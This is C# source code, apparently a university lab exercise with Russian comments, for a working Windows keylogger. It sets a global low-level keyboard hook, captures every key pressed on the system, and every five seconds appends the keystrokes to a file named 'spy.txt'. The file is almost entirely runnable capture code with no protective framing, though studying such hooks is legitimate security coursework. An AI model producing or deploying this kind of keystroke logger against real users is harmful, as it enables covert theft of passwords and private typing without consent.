using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

using System.Diagnostics;

using System.Runtime.InteropServices;
using System.IO;

internal class HookDemoHelper

{

    private const int WH_KEYBOARD_LL = 13;    // installs a hook procedure that monitors low-level keyboard input events
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSTEMDOWN = 0X0104;

    private delegate IntPtr LowLevelKeyboardProcDelegate(int nCode, IntPtr wParam, IntPtr lParam);
    private LowLevelKeyboardProcDelegate m_callback;
    private IntPtr m_hHook;

    private string text = "";

    public string Text
    {
        get {
            string temp = text;
            text = "";
            return temp; 
        }
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


    private IntPtr LowLevelKeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSTEMDOWN))
        {
            int vkCode = Marshal.ReadInt32(lParam);
            text += ((Keys)vkCode).ToString();
            Console.Write((Keys)vkCode + " ");     // считывает 1-ое значения типа инт в неуправляемой памяти
        }

        return CallNextHookEx(m_hHook, nCode, wParam, lParam);
    }



    public void SetHook()
    {
        m_callback = LowLevelKeyboardHookProc;
        m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback, GetModuleHandle(IntPtr.Zero), 0);
    }// registratiya обратного вызова

    public void Unhook()
    {
        UnhookWindowsHookEx(m_hHook);
    }  // удаление обратного вызова
}

namespace lab4
{
    class Program
    {
        private static string filename;
        private static HookDemoHelper me;
        static void Main(string[] args)
        {
            filename = "spy.txt";
            me = new HookDemoHelper();
            me.SetHook();

            // устанавливаем метод обратного вызова
            TimerCallback tc = new TimerCallback(MyTimerCallback);
             
            // создаем таймер
            System.Threading.Timer timer = new System.Threading.Timer(tc, new object(), 1000, 5000);

            Application.Run();
            me.Unhook();
        }
        public static void MyTimerCallback(object obj)
        {
            using (FileStream fstream = new FileStream(filename, FileMode.Append))
            {
                // преобразуем строку в байты
                byte[] array = System.Text.Encoding.Default.GetBytes(me.Text);
                // запись массива байтов в файл
                fstream.Write(array, 0, array.Length);
                Console.WriteLine("Текст записан в файл");
            }
        }

    }
}